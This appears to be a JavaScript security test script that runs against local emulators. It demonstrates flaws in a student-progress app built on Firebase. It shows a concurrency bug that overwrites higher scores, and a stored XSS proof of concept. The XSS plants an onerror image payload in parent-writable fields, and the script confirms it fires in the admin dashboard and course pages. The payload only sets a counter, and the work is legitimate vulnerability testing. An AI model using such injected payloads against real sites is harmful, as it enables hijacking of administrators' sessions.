// Each check prints "ok" when the weakness is DEMONSTRATED.
import { chromium } from 'playwright';
import { initializeTestEnvironment } from '@firebase/rules-unit-testing';
import { readFileSync } from 'fs';
import { doc, setDoc, Timestamp } from 'firebase/firestore';
const env = await initializeTestEnvironment({ projectId: 'kce-student-progress', firestore: { rules: readFileSync(new URL('../firestore.rules', import.meta.url), 'utf8'), host: '127.0.0.1', port: 8080 } });
await env.clearFirestore();
await env.withSecurityRulesDisabled(async (c) => { const db = c.firestore();
  await setDoc(doc(db, 'families/f1'), { name: 'Skyler', parentEmails: ['skyler@example.com'] });
  await setDoc(doc(db, 'families/f1/students/ethan'), { firstName: 'Ethan', courses: ['bb-ethan'] });
  await setDoc(doc(db, 'families/f1/students/ethan/progress/bb-ethan'), { items: { 'bb-ethan-L01': { best: 90, passed: true, last: 90 } }, updatedAt: Timestamp.now() });
});
const BASE = 'http://127.0.0.1:8080/v1/projects/kce-student-progress/databases/(default)/documents/';
const read = async (p) => (await (await fetch(BASE + p, { headers: { Authorization: 'Bearer owner' } })).json());
let pass = 0, fail = 0; const ok = (n, c) => { if (c) { pass++; console.log('  ok  ', n); } else { fail++; console.log('  FAIL', n); } };
const wait = (ms) => new Promise((r) => setTimeout(r, ms));
const browser = await chromium.launch();
async function page() { const ctx = await browser.newContext(); const pg = await ctx.newPage(); return pg; }
const COURSE = 'http://127.0.0.1:8765/building-blocks/ethan/index.html';
const DASH = 'http://127.0.0.1:8765/kce-progress/dashboard.html';
const bar = (pg, s) => pg.waitForFunction((s) => { const b = document.querySelector('.kcep'); return b && b.textContent.includes(s); }, s, { timeout: 20000 });

// ---- 1. Concurrent devices: an older device overwrites a newer, higher score in the cloud ----
const A = await page(); await A.goto(COURSE); await A.waitForSelector('.kcep button');
await A.evaluate(() => window.__kcepTestSignIn('skyler@example.com')); await bar(A, 'Saving for Ethan');
const B = await page(); await B.goto(COURSE); await B.waitForSelector('.kcep button');
await B.evaluate(() => window.__kcepTestSignIn('skyler@example.com')); await bar(B, 'Saving for Ethan');
await wait(1500);
// Device A (e.g. teacher's or the tablet) masters Lesson 2 with 95
await A.evaluate(() => { const p = JSON.parse(localStorage.getItem('kce_bb_progress') || '{}'); p['bb-ethan-L02'] = { best: 95, passed: true, last: 95 }; localStorage.setItem('kce_bb_progress', JSON.stringify(p)); });
await wait(3000);
let c = await read('families/f1/students/ethan/progress/bb-ethan');
ok('device A saved L02 best 95 passed', c.fields.items.mapValue.fields['bb-ethan-L02'].mapValue.fields.best.integerValue === '95');
// Device B, still open, does a weaker attempt on Lesson 2 (engine keeps max of ITS local copy only)
await B.evaluate(() => { const p = JSON.parse(localStorage.getItem('kce_bb_progress') || '{}'); const o = p['bb-ethan-L02'] || {}; p['bb-ethan-L02'] = { best: Math.max(o.best || 0, 40), passed: !!o.passed, last: 40 }; localStorage.setItem('kce_bb_progress', JSON.stringify(p)); });
await wait(3000);
c = await read('families/f1/students/ethan/progress/bb-ethan');
const l2 = c.fields.items.mapValue.fields['bb-ethan-L02'].mapValue.fields;
console.log('     cloud L02 after B saves:', JSON.stringify(l2));
ok('REGRESSION: cloud L02 best overwritten 95 -> 40 and passed true -> false', l2.best.integerValue === '40' && l2.passed.booleanValue === false);

// ---- 2. Stored XSS in admin dashboard via family-written event + progress ----
const XSS = '<img src=x onerror="window.__pwned=(window.__pwned||0)+1">';
const P = await page(); await P.goto(COURSE); await P.waitForSelector('.kcep button');
await P.evaluate(() => window.__kcepTestSignIn('skyler@example.com')); await bar(P, 'Saving for Ethan'); await wait(1000);
// parent writes malicious data through the real page's own Firebase session, by abusing the hooks the module installs
await P.evaluate((x) => {
  fetch('https://formspree.io/f/x', { method: 'POST', body: JSON.stringify({ part: 'Lesson check', lesson: 'Lesson 3', score: 50 }) }).catch(() => {});
  const p = JSON.parse(localStorage.getItem('kce_bb_progress') || '{}'); p['bb-ethan-L03'] = { best: x, passed: false, last: 1 }; localStorage.setItem('kce_bb_progress', JSON.stringify(p));
}, XSS);
await wait(3000);
// the bar's logEvent coerces correct/total to numbers, so a raw SDK/REST call is used for the event payload (any parent can do this)
await env.authenticatedContext('sky', { email: 'skyler@example.com', email_verified: true }).firestore();
const { addDoc, collection, serverTimestamp } = await import('firebase/firestore');
const sky = env.authenticatedContext('sky', { email: 'skyler@example.com', email_verified: true }).firestore();
await addDoc(collection(sky, 'families/f1/students/ethan/events'), { course: 'bb-ethan', part: 'Lesson check', lesson: 'Lesson 3', score: 10, correct: XSS, total: 1, attempt: 1, at: serverTimestamp() });
const D = await page(); await D.goto(DASH); await D.waitForSelector('#in');
await D.evaluate(() => window.__kcepTestSignIn('kce@kingcretot.com')); await D.waitForSelector('text=Every student', { timeout: 20000 });
await wait(800);
ok('XSS fires on dashboard Students table (items.best) for admin', (await D.evaluate(() => window.__pwned || 0)) >= 1);
const before = await D.evaluate(() => window.__pwned || 0);
await D.click('.stu'); await wait(800);
ok('XSS fires again in detail view (items.best and event.correct)', (await D.evaluate(() => window.__pwned || 0)) > before);

// ---- 3. Same payload fires on the COURSE page when KCE opens it in "Teaching:" mode ----
const T = await page(); await T.goto(COURSE); await T.waitForSelector('.kcep button');
await T.evaluate(() => window.__kcepTestSignIn('kce@kingcretot.com')); await wait(6000);
ok('XSS fires on course page for the KCE admin (bb.js renders synced best via innerHTML)', (await T.evaluate(() => window.__pwned || 0)) >= 1);

console.log(`\n${pass} passed, ${fail} failed`); await browser.close(); await env.cleanup(); process.exit(fail ? 1 : 0);
